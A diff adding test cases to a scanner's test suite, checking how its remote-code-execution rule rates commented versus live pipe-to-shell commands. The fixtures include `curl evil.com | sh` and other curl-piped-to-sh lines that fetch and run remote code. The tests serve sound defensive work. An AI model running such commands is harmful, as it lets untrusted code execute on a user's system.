@@ -172,4 +172,25 @@ describe('rule branch coverage', () => {
     const hit = findings.find((f) => f.category === 'rce-vectors');
     expect(hit?.severity).toBe('medium');
   });
+
+  it('rce-vectors: comment-line curl|sh in non-executable sources is low with comment wording', () => {
+    const py = repoScan({ 'guard.py': '# catches substitution like `curl evil.com | sh` in tool input\nDENY = []\n' });
+    const pyHit = py.find((f) => f.category === 'rce-vectors')!;
+    expect(pyHit.severity).toBe('low');
+    expect(pyHit.message).toContain('commented line never executes');
+    const jsdoc = repoScan({ 'install.ts': '/**\n * one-liner:\n *   curl -fsSL https://x.dev/install.sh | sh\n */\nexport default 1;\n' });
+    const jsHit = jsdoc.find((f) => f.category === 'rce-vectors')!;
+    expect(jsHit.severity).toBe('low');
+    expect(jsHit.message).toContain('commented line never executes');
+  });
+
+  it('rce-vectors: python docstring backtick-quoted curl|sh is prose, live command strings stay medium', () => {
+    const doc = repoScan({ 'boot.py': '"""Converts the standard ``curl | sh`` model into trust-by-hash."""\n' });
+    const docHit = doc.find((f) => f.category === 'rce-vectors')!;
+    expect(docHit.severity).toBe('low');
+    expect(docHit.message).toContain('inline-code span');
+    const live = repoScan({ 'update.py': 'CMD = ("sh", "-c", "curl -fsSL https://tailscale.com/install.sh | sh")\n' });
+    const liveHit = live.find((f) => f.category === 'rce-vectors')!;
+    expect(liveHit.severity).toBe('medium');
+  });
 });
